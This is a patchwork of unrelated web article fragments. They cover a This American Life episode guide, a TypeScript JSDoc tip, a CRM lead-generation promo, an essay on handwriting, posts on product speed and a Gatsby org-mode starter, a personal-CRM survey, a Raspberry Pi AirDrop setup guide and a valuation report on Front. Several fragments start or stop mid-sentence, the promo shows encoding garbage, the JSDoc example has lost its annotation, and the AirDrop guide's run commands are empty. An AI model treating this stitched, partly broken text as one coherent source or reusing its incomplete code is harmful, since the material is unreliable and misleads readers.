Life</em> was perfectly positioned to reach into the heart of these major stories and record the shifting ground under life in these United States.</p><p>The second fact is that we like long episodes. During that same five-year period, <em>This American Life</em> began to earn its reputation for blockbuster, hour-long narratives that would carry it into the 2010s. Some of these episodes — “The Giant Pool of Money,” “#1 Party School” among them — are so legendary that one can now forget that the show’s bread and butter has always been its act-based structure. The power of this method, one which many podcasts, due to their niche focuses, can never quite live up to, is to find disperse stories on a theme and situate them together in a way that makes them resonate in new ways.</p><p>This resonance gives these stories, some of them goofy, nerdy, or downright silly, the power to reshape one’s feelings. While on the surface <em>This American Life</em> can fall prey to the kind of neoliberal ephemera people lambast public radio for, underneath there is a radical current that infuses many of the episodes that we’ve chosen here. The program can be a one-hour chapter of <em>The People’s History</em> delivered to radio each week. It puts the faults and frailties of the U.S. on naked display, stripped of the power, prestige, and distance that older and more traditional mediators dress them in. It is for this reason, and the ones listed below, that we find <em>This American Life</em> to be one of the greatest American journalism projects. <em>– Brendan Mattox</em></p><p><strong><a href="https://www.thisamericanlife.org/15/dawn" target="_blank" rel="noopener noreferrer">15: Dawn</a></strong></p><p>An early highlight of <em>This American Life</em> is “Dawn,” the episode first to give the entire hour over to a single contributor. Master storyteller and magazine journalist Jack Hitt’s work holds a strong influence over the first decade of the program. “Dawn” follows Hitt as he interviews old friends and family in Charlotte about a mysterious neighbor. Fans of the podcast <em>S-Town</em> will find much to love here, as the Faulkneresque story of the end of The Old South yields to a story about sexuality, gender, and the way that media inserts itself into the stories of our lives.</p><p><strong><a href="https://www.thisamericanlife.org/61/fiasco-1997" target="_blank" rel="noopener noreferrer">61: Fiasco!</a></strong></p><p>One of <em>This American Life</em>’s most rerun episodes, “Fiasco!” is a collection of masterful debacles. Everything goes wrong, at least once in a while. When it does, you can only hope someone is there to record the wreckage. A community theater’s attempt to dazzle in their production of <em>Peter Pan </em>shatters the fourth wall and a rookie cop succumbs to a devious foe (a squirrel). Each of the episode’s four acts investigates a doomed, hilarious series of errors.</p><p><strong><a href="https://www.thisamericanlife.org/80/running-after-antelope" target="_blank" rel="noopener noreferrer">80: Running After Antelope</a></strong></p><p>The legend about TAL contributor Scott Carrier (later explored in Carrier’s own podcast <em><a href="https://homebrave.com/" target="_blank" rel="noopener noreferrer">Home of the Brave</a></em>) is that he started making radio by hitchhiking, cross-country, from his home in Utah to the NPR headquarters in Washington, D.C. Arriving on a Saturday, he asked the first <em>Weekend Edition</em> producer who would listen to teach him how to make radio. Carrier is fiercely partisan, an outsider in every possible sense, and keenly unafraid to burn bridges. He writes like Hemingway, with brief language, quick movement, and constant grappling with the more toxic angles of masculinity. He can sound, at times, both dangerous and uniquely tuned to an unknown rhythm. All of these traits are on display in “Running After Antelope,” a 40-minute narrative of a decade-long attempt to chase down an antelope on foot, and how his desire to be “primitive” conflicted with the inexorable movement of time. Carrier would later get a full episode of <em>This American Life</em> dedicated to his work (<a href="https://www.thisamericanlife.org/181/the-friendly-man" target="_blank" rel="noopener noreferrer">181: The Friendly Man</a>).</p><p><strong><a href="https://www.thisamericanlife.org/109/notes-on-camp" target="_blank" rel="noopener noreferrer">109: Notes on Camp</a></strong></p><p>This episode is yet another example of <em>This American Life</em>’s ability to turn a mundane topic — in this case, stories from summer camp — into a meaningful exploration of our values. The camp stories are funny and awkward, as we all were during our early adolescent summers. The scary stories, first kisses, and halting efforts at adulthood that appear throughout the episode answer at least some of the questions they pose about community and the importance of being together.</p><p><strong><a href="https://www.thisamericanlife.org/172/24-hours-at-the-golden-apple" target="_blank" rel="noopener noreferrer">172: 24 Hours at the Golden Apple</a></strong></p><p>One of the hallmarks of <em>This American Life</em> is its commitment to telling stories of everyday life, eschewing the need for every episode to be relevant to the news. “24 Hours at the Golden Apple,” an episode with a rather literal title, shows this approach can be revelatory. In this episode, Glass and a few other producers spend the day at a local Chicago diner, from early morning until late into the night. We meet a regular who plays harmonica as the sun rises, a waitress who’s been working the night shift for the past 26 years, a pair of teen girls trying to corral friends to come join them at the diner, and many, many others.</p><p><strong><a href="https://www.thisamericanlife.org/199/house-on-loon-lake" target="_blank" rel="noopener noreferrer">199: House on Loon Lake</a></strong></p><p>In this engrossing episode, producer Adam Beckman tells the story of how, when he was eleven years old, he and two friends came across an abandoned house in the small town of Freedom, New Hampshire. The three boys dare each other to venture inside, and what they find — a crumbling newspaper, decaying clothes, old letters, and much more — hints that the home had been untouched for decades. From there, “a sort of real-life Hardy Boys mystery” commences, as Beckman and his friends work to uncover who lived in the house and the circumstances under which they had to leave.</p><p><strong><em>Want to receive our latest podcast reviews and episode recommendations via email? <a href="https://podcastreview.org/newsletter">Sign up here</a> for our weekly newsletter.</em></strong></p><p><strong><a href="https://www.thisamericanlife.org/205/plan-b" target="_blank" rel="noopener noreferrer">205: Plan B</a></strong></p><p>“Plan B”&nbsp;features stories from two of <em>This American Life</em>’s former contributors, John Hodgman and Jonathan Goldstein. In one sense, John Hodgman’s story, It’s Another Tequila Sunrise, is about Cuervo Man, Jose Cuervo’s Princeton-educated brand ambassador who seemingly exists to balance tequila shots on his head and be the life of the party. In another, it’s about fear and acceptance of who we are. Jonathan Goldstein faces similar considerations as he deals with his unexpected success as a telemarketer. Both segments wrap the discomfort of self-examination in the humor of Hodgman and Goldstein’s small absurdities.</p><p><strong><a href="https://www.thisamericanlife.org/220/testosterone" target="_blank" rel="noopener noreferrer">220: Testosterone</a></strong></p><p>The episode in which every <em>This American Life</em> crew member decides to measure their testosterone levels competition-style begins with Alex Blumberg’s quest to find out how much the hormone has shaped his life. Two excellent, extended interviews give this 2002 show its verve: one with a journalist whose body briefly stopped producing testosterone, one with a transgender man who noticed a series of astounding changes to his own thought patterns when he began testosterone injections. The episode doesn’t seek to prove anything, but hearing these two men, plus every TAL producer, try to understand how hormones inform their character is funny and fascinating.</p><p><strong><a href="https://www.thisamericanlife.org/241/20-acts-in-60-minutes" target="_blank" rel="noopener noreferrer">241: 20 Acts in 60 Minutes</a></strong></p><p>The entire cast of characters briefly guest star in the 2003 episode that abandoned the regular act-based structure for 20 mini-stories. Jonathan Goldstein tells a long joke. David Rakoff reveals his bad instincts. Starlee Kine finds the perfect punch line about low-level celebrity. David Sedaris finds out he’s been duped for years. Ira Glass discovers the mystery of Vienna Beef. The ultimate highlights of the experiment, Acts 6 and 20, tell two stories from separate juvenile detention centers.</p><p><strong><a href="https://www.thisamericanlife.org/266/im-from-the-private-sector-and-im-here-to-help" target="_blank" rel="noopener noreferrer">266: I’m from the Private Sector and I’m Here to Help</a></strong></p><p>If one wants to pinpoint the shift of <em>This American Life</em> towards its current reputation for intensely original reporting, a strong contender is this 2004 report on the employees of Custer Battles, one of the many private security contractors to flood Iraq in the wake of the United States contentious (and <a href="http://news.bbc.co.uk/1/hi/world/middle_east/3661134.stm">illegal</a>) invasion in 2003.

<p>Hi, in this post I will show how to use Typescript with static typings without needing a build step. I have also <a target="_blank" href="https://github.com/swordcss/swordcss">implemented this in my project SwordCSS</a>.</p>
<h2 id="installation">Installation</h2>
<p>We still need to install and configure Typescript though.</p>
<pre><code>$ <span>npm</span> install -D typescript
</code></pre><p><code>tsconfig.json</code>:</p>
<pre><code>{
  <span>"compilerOptions"</span>: {
    <span>"moduleResolution"</span>: <span>"node"</span>,
    <span>"module"</span>: <span>"CommonJS"</span>,
    <span>"target"</span>: <span>"ESNext"</span>,
    <span>"sourceMap"</span>: <span>false</span>,
    <span>"declaration"</span>: <span>false</span>,
    <span>"checkJs"</span>: <span>true</span>,
    <span>"allowJs"</span>: <span>true</span>
  }
}
</code></pre>
<p>You can change the options however you want, but make sure the last four <code>compilerOptions</code> are the same.</p>
<h2 id="jsdoc">JSDoc</h2>
<p>Now, let me give you an introduction to JSDoc. JSDoc is a format for commenting on and annotating Javascript code. Here is how you would use it with Typescript:</p>
<pre><code>

<span><span>function</span> <span>doingSomething</span>(<span>param1, param2</span>) </span>{
    doSomething(param1, param2)
}
</code></pre>
<p>Or at least that is how you would use it with functions. There are some other things you can do, and you can look at what is supported with JSDoc + Typescript.</p>
<p><strong>IMPORTANT</strong> You must have <code>//@ts-check</code> at the top of your file for it to be type checked.</p>

          <div>
            <div data-animation-name="slideInUp">
              <h2>Youâ€™ve launched your new productâ€¦ Now what? Time to Get Selling! Hereâ€™s how...</h2>

<p>While the transition from initial product development to sales sounds easy enough, the shift is actually one of the biggest challenges for entrepreneurs and startups. After months of long, hard work developing your product, the actual launch feels like the finish line. In fact, the race has just begun. You finally have something to offer, so now itâ€™s time to get selling. Make it rain.</p>

<p>But, you have no idea how to make a light drizzle, let alone a rainstorm. You need to find people who want your product and are willing to pay for it. Beyond friends and family, how do you find people interested in what you offer? You need leads and there are tools that can help you find them.</p>

<p>Lead generation <em>(or lead gen, as many entrepreneurs call it)</em> is the process of locating prospects that might be interested in your product so that you can reach out, introduce your product and start to get people interested. It helps you to start selling, which you need to create revenues, keep the lights on, and, ultimately, grow.</p>

<p>Of course, lead-gen is the start of the selling process. The sales cycle can be quite involved, including lead nurturing and conversion, but letâ€™s focus on lead-gen for now.</p>

<h2>How Do You Generate Leads?</h2>

<p>It all starts with understanding your target customer. Who actually needs the product you offer? Who is experiencing the problem your product solves? Is this a solution for large corporations, medium-sized companies, or small, emerging businesses? Or perhaps it appeals to individuals, to families, to retired homeowners or bicycle commuters or Parkour-practicing pet owners. To be successful, start with one target. You can expand with other campaigns to broaden your revenue streams down the road, but for now, focus on one.</p>

<p>Whoâ€™s the decision-maker for this solution within the organization. If you are offering accounting software, for example, you might want to target the Chief Financial Officer (CFO) and the financial team. For office cleaning products, youâ€™d want to reach office managers, and if itâ€™s an employee training program, youâ€™d target the HR team.</p>

<p>Traditionally, the sales team would seek out lists from organizations that reach the target audience -- often magazines or trade organizations. A list of CFO Magazine readers, for example, was the best way to reach leads who worked in finance. The rise of social media has changed this, providing new ways to interact with a target audience. Today, businesses need a better way to sell than simply making cold calls downs on a static list. You need dynamic solutions that find qualified leads and provide information that helps you sell better.</p>

<p>Fortunately, lead-gen has become automated and highly targeted. Drawing on lists, but also social information and data, lead-gen can provide a more detailed context to help you sell. Beyond finding CFOs who might want your product, look for a solution that helps you understand the preferences of each lead. What are the CFOâ€™s preferred social media channels? Is she active on LinkedIn? How long has she been the CFO? Does she belong to a professional organization? Is she quoted in business news articles?</p>

<p>To take advantage of these new techniques, look for Customer Relationship Management (CRM) solutions that can generate leads, provide rich information on each customer, and help you manage the experience throughout the entire customer lifecycle. While some stand-alone lead-gen applications can help, the integrated CRM approach will help you not only generate leads but convert them to loyal customers that can fuel your growth for years to come.</p>

<p>There are mM=any CRM solutions to choose from. The market leaders are effective for large, enterprise customers but are costly and can be overkill for small, emerging businesses. Seek out a CRM solution designed for start-ups and high-growth companies. You want a solution that will generate leads, help you start selling, and successfully move from pure product development to sales that will allow your company to survive and thrive â€” without the high cost or high-pressure upsell from the CRM provider.</p>

<p>Tapdesk is a CRM platform designed for companies as small as one solopreneur and is extremely effective for businesses with up to 250 users. Itâ€™s a solution designed to help startups get started, generate revenue, and begin to grow. It was built to make lead gen easy and straightforward, to help your company get selling.</p>

We are quickly embracing digital alternatives because they are more efficient and easy to use.</span></span></p><p><span><span>Holiday greetings are being written on WhatsApp or email because itâ€™s fast, grocery lists are written in a to-do app because itâ€™s convenient, and documents are being written in the cloud because itâ€™s collaborative. But the convenience has a downside.</span></span></p><p><span><span><span><span><strong>People are gradually forgetting how to write.</strong></span></span></span></span></p><p><span><span>Especially those whose languages depend on strokes and symbols like Chinese and Japanese. A </span><span><a href="https://www.youtube.com/watch?v=zxHskrqMqII" target="_blank" rel="noopener noreferrer">street-survey</a></span><span> by a popular YouTube channel, Asian Boss has showed that all of their Chinese interviewees have â€” to a certain extent â€” forgotten how to write certain words. A similar </span><span><a href="https://www.youtube.com/watch?v=sJNxPRBvRQg" target="_blank" rel="noopener noreferrer">street-survey</a></span><span> by That Japanese Man Yuta on YouTube reported the same outcome with native Japanese people. The main reason? Keyboards.</span></span></p><p><span><span><strong><span><span>But is this a bad thing? Yes and no.</span></span></strong></span></span></p><p><span><span>Yes, because writing will be a lost art but most importantly, there are evidences that suggest writing have certain cognitive benefits.</span></span></p><p><span><span>However, as a language-learner, this speeds up the process of learning. Rather than learning how to write complex characters, learners will only need to learn how to recognize them. Vocabulary flashcards and reading exercises are sufficient and more practical to learn characters.</span></span></p><p><span><span>Since the world is becoming less reliant on pen and paper, there is no need for casual â€” or even serious â€” language learners to learn how to write. Take the Japanese language proficiency exams for instance. There is no written exam at all, from beginner to advanced tests. All you need to know is how to read and comprehend conversations.</span></span></p><p><span><span>I personally havenâ€™t used a pen for serious writing in years. I am also learning various languages, like Mandarin and Arabic, by reading and typing instead of writing. Am I declining cognitively? I donâ€™t think so. I exercise every day, eat moderately, and read abundantly. Surely, thatâ€™s enough.</span></span></p><p><span><span>How do you feel about this?

<p>When building products, there are two things that seem extremely important: scope and speed to feedback.</p>

<p>If you can ruthlessly prioritize, you can focus. If you can tighten your feedback loops, you can iterate faster. Both of these things will allow you to move very fast in the right direction. But more than that, James Somers talks about the perceived weight of work being reduced dramatically by working quickly in general: <a href="http://jsomers.net/blog/speed-matters">Speed Matters</a></p>

<p>In essence, if something takes a long time, you will avoid it. If it happens quickly, you will do more of it.</p>

<p>The same thing is true of the end-user’s experience of the software itself. If they can focus and the software feels fast, they will use it more. The pleasure of using it makes you want to use it more. Craig Mod writes about this beautifully here: <a href="https://craigmod.com/essays/fast_software/">Fast Software, the Best Software</a></p>

<p>While reading up on feedback loops I ran across Andrew Certain’s explanation of how communication and consensus can cripple the feedback loops that allow software to be developed faster. In order to increase speed at Amazon, Bezos basically said to ditch the idea of avoiding duplication of effort in order to execute faster (read the whole thread!):</p>

<blockquote data-conversation="none"><p lang="en" dir="ltr">Part of the reason for Amazon's incredible success across a staggering array of ventures is our focus on pushing autonomy down as far as possible. Jeff said from the start, "I don't want to make communication more efficient - I want there to be less communication!"</p>— Andrew Certain (@tacertain) <a href="https://twitter.com/tacertain/status/1166039964582199297?ref_src=twsrc%5Etfw">August 26, 2019</a></blockquote>


<p>The cost of communication, transparency, and consensus was so high that it wasn’t worth the effort. It was actually better to get rid of cross-team communication and heavily segment the application in order to ship new products faster. Werner Vogels, Amazon’s CTO goes into more detail here: <a href="https://www.allthingsdistributed.com/2019/08/modern-applications-at-aws.html">Modern Applications at AWS</a>.</p>

<p>This is an almost heretical idea on its face and goes against a core tenant of software development: Don’t repeat yourself!</p>

<p>The ideas of ‘fail fast’ and ‘move fast and break things’ are now widely satirized. However, I think they’re still deeply true. Moving fast is exciting, just look at any new burgeoning software framework. People love to get involved in projects that really <em>feel</em> fast. They’re rewarding and there’s the most opportunity to really stand out and feel like your contribution matters.</p>

<p>Anything that slows you down should be looked at with skepticism and there should be insanely high value associated with the trade-off.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p><a href="https://orgmode.org/worg/org-tutorials/org-publish-html-tutorial.html">org-mode export function</a> is great, but simple <code>html</code> + <code>css</code> is not going to cut it any more. To create a modern website using your org files, with <a href="https://www.gatsbyjs.com/">gatsby</a> as the backbone, simply do this:</p><pre><code>npm install -g gatsby-cli
gatsby new my-website https://github.com/orgapp/gatsby-starter-blorg</code></pre><p>It's one command away from getting it running locally. You will have a powerful website sitting on <a href="http://localhost:8000/">localhost:8000</a> afterwards. Which conveniently, also is a complete documentation of the tool.</p><pre><code><span>cd</span> gatsby-site 
npm run develop</code></pre><div><h2>What's in the Box</h2><p>You get all the benefits from <a href="https://www.gatsbyjs.com/">gatsbyjs</a>, the flagship tool for creating modern websites. It will net a pretty good score on Google's website evaluation tests.</p><figure><img src="https://www.huxiaoxing.com/static/web-dev-score-a9fb284db6549f60368aaf7f6a6bb65b.png"><figcaption>Google web.dev score of the starter project</figcaption></figure><p>Here is a list of the important (in my opinion) features you get right away.</p><div><h3>Optimised for SEO</h3><p>You get detailed metadata for every page. They came from your org file itself (properties, tags, description etc...). Open up inspector of this page, and you will see something like this:</p><figure><img src="https://www.huxiaoxing.com/static/seo-showcase-dd6e19910e92e589cfc0e656e5af1c34.png"><figcaption>SEO</figcaption></figure><p>Some of them will help boost your website visibility on the internet. The Twitter ones will make your pages look amazing when shared on Twitter.</p><figure><img src="https://www.huxiaoxing.com/static/post-tweet-preview-c50e2858c6fb8d5c1ad8156c88340505.png"><figcaption>tweet card preview</figcaption></figure></div><div><h3>Responsive Design</h3><p>Over time, more people will be reading your words on their tiny smartphone screens instead of a glorious 4K display like yours. Resize the window to see how it transforms into a different layout gracefully.</p></div><div><h3>Progressive Web App (PWA)</h3><p>I don't need my website to be as sophisticated as an <code>app</code>, but it is nice to add additional resistance to a bad network to it. Your website will pre-fetch content and cache it in the browser like an app. So the whole website works 100% even when your device is offline. Also clicking an internal link feels like pressing a button on an app.</p></div><div><h3>Blazing Fast</h3><p>Gatsby is fantastic when it comes to optimising your website for the modern internet. All the files are small and split in logical ways to minimise traffic required to open your website. Believe it or not, even though the whole thing is written in JavaScript and React, your website can render correctly with JavaScript turned off<sup id="fnr-1" data-label="1"><a href="#fn-1">[1]</a></sup>. Everything is rendered at build time.</p></div><div><h3>Dark Mode</h3><p>Colour is a personal thing. The point is, you can customise every single detail about them, and you get two sets of them.</p><figure><img src="https://www.huxiaoxing.com/static/dark-mode-showcase-3121722da7a4d2263bda64b8c1888243.png"><figcaption>light/dark mode side by side</figcaption></figure></div><div><h3>Highly Customisable</h3><p>Every bit of the website is customisable. From the header to footer, from the post layout to the date and tags. If you'd like, you can nuke everything and build them from scratch.</p></div></div><div><h2>Designed with org-mode user in mind</h2><p>In some sense, org-mode is similar to markdown. But it's so much more flexible. So people use it in all kinds of ways. The following features are tailored particularly for org-mode users.</p><ul><li>Not everyone likes to write their stories on a per-file basis, so you can publish posts at both headline level and/or file level.</li><li>Instead of massive configuration options in a JSON file, the configuration stays in your org files via <a href="https://orgmode.org/manual/In_002dbuffer-Settings.html">In-Buffer Settings</a> and <a href="https://orgmode.org/guide/Properties.html">Properties</a> wherever possible.</li></ul></div><div><h2>What's the Catch</h2><ul><li>You going to have to be okay with the fact that it's written in JavaScript.</li><li>It is react based, so if you want to go deep in the customisation game, you going to have to be comfortable with copy &amp; pasting, maybe tweaking some <code>jsx</code> or <code>tsx</code> files.</li></ul></div><div><h2>Getting Started</h2><p>Why reinventing wheels over and over when you can stand on the shoulders of the giants and just benefit from others' struggles? Obviously, the giants here are the open-source communities. That's the reason I built the org-mode parser <a href="https://github.com/orgapp/orgajs">orgajs</a> in JavaScript (TypeScript actually) in the first place, to integrate with the mass. With a couple of simple plugins, it works seamlessly with a well-established ecosystem (namely <a href="https://www.gatsbyjs.com/">gatsbyjs</a>). I am taking massive advantage of other people's work, and it goes along with the evolution of the ecosystem. I know us geeks won't ever be satisfied on pre-made stuff. That's why I create multiple levels of customisation points in the tool (articles coming later). If you have any issue or suggestions for the project, you can create issues. Or talk to <a href="https://twitter.com/xiaoxinghu">me on Twitter</a> directly. I would love to know your thoughts. If you are ready to <a href="https://orgapp.github.io/gatsby-starter-blorg/">Get Started</a>, do so.</p></div><dl id="footnotes"><dt>[1]</dt><dd><p>You do need JavaScript turned on when you want more dynamic pages that, for example, does data fetching at render time. Of cause you don't need any of that for your blog post pages since they are pre-rendered at build time.</p></dd></dl></div></div></section></div>]]>

                <p>Personal CRM — relationship management software for consumers — is not a new category. &nbsp;Early versions of <a href="https://en.wikipedia.org/wiki/Cardfile">Microsoft’s Cardfile</a> date back to 1985. Broadly defined, ‘personal CRM’ helps <em>individuals</em> build out their professional and personal networks. We attribute the term to individuals repurposing sales customer-relationship management (CRM) software such as Hubspot to manage their personal networks; creating “Personal CRM.” Phrases like “Social CRM” have been used to describe relationship management software for individuals <a href="https://www.forbes.com/sites/tomiogeron/2011/10/05/linkedin-acquires-social-crm-company-connected/#63ef5e0c6c3d">since 2011</a>.</p><p>This article details the current landscape of personal relationship management software.</p><h2 id="overview">Overview</h2><p>Personal CRM solutions in 2020 have a variety of target audience and key feature differentiators.

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In this article, we are going to get AirDrop running on a Raspberry Pi 3 (not B+, unfortunately) running Rasbian Stretch.
While AirDrop itself implements a HTTP-based protocol (see <a href="https://owlink.org/code/">OpenDrop</a>), it uses a dedicated Wi-Fi based link layer called Apple Wireless Direct Link (AWDL). In order to use AirDrop, we’ll enable AWDL capabilities on the Raspberry Pi using <a href="https://owlink.org/code/">OWL</a>, our open AWDL implementation. OWL is implemented as user space program and requires a Wi-Fi card with working monitor mode and frame injection.</p>

<h2 id="enable-monitor-mode-with-frame-injection">Enable monitor mode with frame injection</h2>

<p>Since the BCM43430A1 Wi-Fi chip in the RPi3 does not support monitor mode out-of-the-box, we’ll use <a href="https://nexmon.org/">Nexmon</a> to patch the firmware.
The following steps are adapted from the project’s <a href="https://github.com/seemoo-lab/nexmon/blob/master/README.md">README</a>.</p>

<p>First, we need to install some dependencies.</p>

<div><div><pre><code><span>sudo </span>apt update <span>&amp;&amp;</span> apt upgrade
<span>sudo </span>apt <span>install </span>raspberrypi-kernel-headers git <span>\</span>
                 libgmp3-dev gawk qpdf bison flex make
<span>sudo </span>apt remove wpasupplicant
</code></pre></div></div>

<p>Then, we prepare Nexmon…</p>

<div><div><pre><code>git clone https://github.com/seemoo-lab/nexmon.git
<span>cd </span>nexmon
<span>touch </span>DISABLE_STATISTICS
</code></pre></div></div>

<p>… and compile required libraries and tools.</p>

<div><div><pre><code><span>sudo </span>su
<span>if</span> <span>[[</span> <span>!</span> <span>-f</span> /usr/lib/arm-linux-gnueabihf/libisl.so.10 <span>]]</span><span>;</span> <span>then</span> <span>\</span>
   <span>cd </span>buildtools/isl-0.10/ <span>&amp;&amp;</span> ./configure <span>&amp;&amp;</span> make <span>&amp;&amp;</span> make <span>install</span> <span>&amp;&amp;</span> <span>\</span>
   <span>ln</span> <span>-s</span> /usr/local/lib/libisl.so <span>\</span>
         /usr/lib/arm-linux-gnueabihf/libisl.so.10 <span>&amp;&amp;</span> <span>\</span>
   <span>cd</span> ../../ <span>;</span> <span>fi
</span><span>source </span>setup_env.sh
make
<span>cd </span>utilities/nexutil/ <span>&amp;&amp;</span> make <span>&amp;&amp;</span> make <span>install</span> <span>&amp;&amp;</span> <span>cd</span> ../../
</code></pre></div></div>

<p>We are now ready to build and install the monitor mode firmware patch.</p>

<div><div><pre><code><span>cd </span>patches/bcm43430a1/7_45_41_46/nexmon/
make
make backup-firmware
make install-firmware
</code></pre></div></div>

<blockquote>
  <p>Note that the above step is only necessary for Wi-Fi chips/drivers where monitor mode and frame injection support is missing. Other chips using the ath9k driver such as the Atheros AR9280 work out-of-the-box. Since Nexmon does not offer frame injection for the BCM43455C0 chip yet, you currently cannot use OWL on a 3B+ model.</p>
</blockquote>

<h2 id="install-owl">Install OWL</h2>

<p>Next, we are installing <a href="https://github.com/seemoo-lab/owl">OWL</a>, our AWDL implementation. First, we need some libraries (libpcap, libev, and libnl).</p>

<div><div><pre><code><span>sudo </span>apt <span>install </span>libpcap-dev libev-dev libnl-3-dev <span>\</span>
                 libnl-genl-3-dev libnl-route-3-dev
</code></pre></div></div>

<p>Then, it should be as easy as:</p>

<div><div><pre><code>git clone https://github.com/seemoo-lab/owl.git
<span>cd </span>owl
git submodule update <span>--init</span>
<span>mkdir </span>build
<span>cd </span>build
cmake ..
make
<span>sudo </span>make <span>install</span>
</code></pre></div></div>

<h2 id="install-opendrop">Install OpenDrop</h2>

<p>In the last step, we’ll install our AirDrop-compatible <a href="https://github.com/seemoo-lab/opendrop">OpenDrop</a> client and server.
Again, we need some dependencies:</p>

<div><div><pre><code><span>sudo </span>apt <span>install </span>python3 python3-pip libjpeg-dev libopenjp2-7-dev
</code></pre></div></div>

<p>Then, we can clone and install the software.</p>

<div><div><pre><code>git clone https://github.com/seemoo-lab/opendrop.git
<span>sudo </span>pip3 <span>install</span> ./opendrop
</code></pre></div></div>

<div>
	<p><a href="https://owlink.org/assets/raspi-airdrop.png">
		<img title="Sending a file to a Raspberry Pi 3 via AirDrop" alt="Sending a file to a Raspberry Pi 3 via AirDrop" src="https://owlink.org/assets/raspi-airdrop.png">
	</a></p><p>Sending a file to a Raspberry Pi 3 via AirDrop</p>
</div>

<h2 id="receive-files-via-airdrop">Receive files via AirDrop</h2>

<p>Now that all tools are installed, we can start a test run and use the Raspberry Pi to receive files via AirDrop.</p>

<p>Since we use Nexmon to enable monitor mode, we need to manually enable monitor mode and set the correct Wi-Fi channel (the RPi3 only supports the 2.4 GHz band, so we’ll use channel 6).</p>

<div><div><pre><code><span>sudo </span>iw phy <span>`</span>iw dev wlan0 info | gawk <span>'/wiphy/ {printf "phy" $2}'</span><span>`</span> interface add mon0 <span>type </span>monitor
<span>sudo </span>ifconfig mon0 up
<span>sudo </span>nexutil <span>-k6</span>
</code></pre></div></div>

<p>Next, we start <code>owl</code> to enable frame reception via AWDL (option <code>-N</code> tells <code>owl</code> that the interface is already in monitor mode, you can add <code>-v</code> to increase the logging output).</p>



<p>In a second shell, we can start the <code>opendrop</code> receiver.</p>



<p>Now, when opening the sharing pane on an iOS device, a new receiver appears after a short delay and we can send files!</p>

And Front was, at first, popular mostly with support teams and other teams that deal with a high volume of customer inquiries. But over time, Front has grown from being a product for a specific kind of workflow to being a tool that people use across organizations.</p><p>The fact is that most companies are still stuck in time from twenty years ago when it comes to managing how they triage, assign, and respond to all those emails. That's a big pain point, because as it turns out, a lot of the critical work that companies do takes place over email. </p><p>What Front has realized is that owning the orchestration and collaboration around email puts them in a position to “back into” $66B worth of vertical markets—CRM, project management, knowledge management, conversational marketing, and others.</p><p>To show the size of that opportunity and demonstrate the progress that Front has made towards its goal in this report, we aggregated all the public data out there on Front, then extrapolating and interpolating to fill in the gaps using backchannels to confirm our numbers.&nbsp;</p><p>We learned that Front, like Slack, has consumer-grade engagement, elite compounding revenue from their land and expand strategy, and increasingly broad adoption inside teams.</p><p>By focusing on external vs. internal communication, however, Front may also have a TAM that is several times as large as Slack's.</p><h2 id="front-s-roadmap-to--2b--4b--20b">Front's roadmap to $2B/$4B/$20B</h2><ul><li><strong>Our financial model values Front at $1.3B, with a price per share around $11.</strong> At their Series C in January, they were valued at $920M, or about $7.70~ per share.</li><li><strong>Front is currently trading on the secondary market between $7.25 and $9.00 per share.</strong> 5-year IRR for each scenario in our model ranges from 3% to 22% in the bear case, 22% to 46% in the base case, and 84% to 118% in the bull case.</li><li><strong>Front is like Slack for email</strong>. It is a multiplayer tool that lets teams better communicate—via chatting with other team members within the context of a personal or shared inbox—and coordinate—via tagging, rules, and 3rd-party integrations—how they respond to email.</li><li><strong>Front's 72% DAU/MAU ratio is on par with elite, consumer-grade apps</strong>. WhatsApp was at 70% pre-Facebook acquisition. Combined with its 148 minutes of average active daily usage (compare to Slack at 90 minutes) Front effectively has the engagement of a high-grade consumer app.</li><li><strong>Front's 137% net dollar retention demonstrates they are landing and expanding with an extremely efficient bottom-up model.</strong> Compare to 143% for Slack at IPO and 140% for Zoom at IPO.</li><li><strong>Zendesk and Intercom pose a threat because they have much deeper access to customer data. </strong>Intercom embeds itself in their customers' websites, giving them direct insight into the behavior of their customers, while Zendesk serves as a centralized hub for all things sales, support, and/or knowledge management for hundreds of thousands of companies.</li><li><strong>However, Front's high engagement platform makes them attractive to third-party developers. </strong>The more activity Front can promote on its platform, and the larger the variety of integrations their customers are using, the more adoption they'll have inside organizations and the wider their moat—based on the cost of switching away to another email product—will become.</li><li><strong>Expanding across organization opens up the opportunity to "back into" $66B worth of adjacent vertical markets </strong>. While today Front is focused on facilitating third-party integrations to tools like Hubspot, Marketo, and Salesforce, building their own versions of these products would allow them to (at minimum, and per product) 2-3x their average revenue per user—today, Zendesk's Enterprise plan costs $199 a seat, while Front's most expensive plan is just $79 per seat.</li><li><strong>Building their own vertical solutions also puts Front on a converging course with Salesforce ($226B), Microsoft ($1.63T), and Google ($1.19T).</strong> Front's endgame is essentially to recreate the Google or Office 365 suite. But Microsoft was able to overtake Slack's active user count within just two years—a company that had similar ambitions. The threat Microsoft/Google pose and their ability to freely push copycat products to a user base of millions could make it extremely challenging for Front to move upmarket and reach enterprise scale.</li><li><strong>Front's product also makes them an attractive acquisition target. </strong>Rather than attempt to build their own team email product, Microsoft and/or Google could buy Front. That said, Salesforce is the company most likely to acquire Front—both because they don't have any email tool of their own yet and because there's no risk of cannibalization or customer confusion as there would be with a Microsoft/Google acquisition.</li><li><strong>Ultimately, Front’s consumer-grade engagement and ability to achieve org-wide adoption position them well to compete on their own in the cloud productivity space</strong>. Most deep workflow products serve specific functional units (Intercom, Zendesk, Salesforce) while products that serve whole teams (Outlook, Gmail) have only superficial access to customer data. Front, on the other hand, is a workflow product and an org-wide tool all in one: a combination that could make them a formidable competitor even to the 800 lb. gorillas of B2B SaaS.
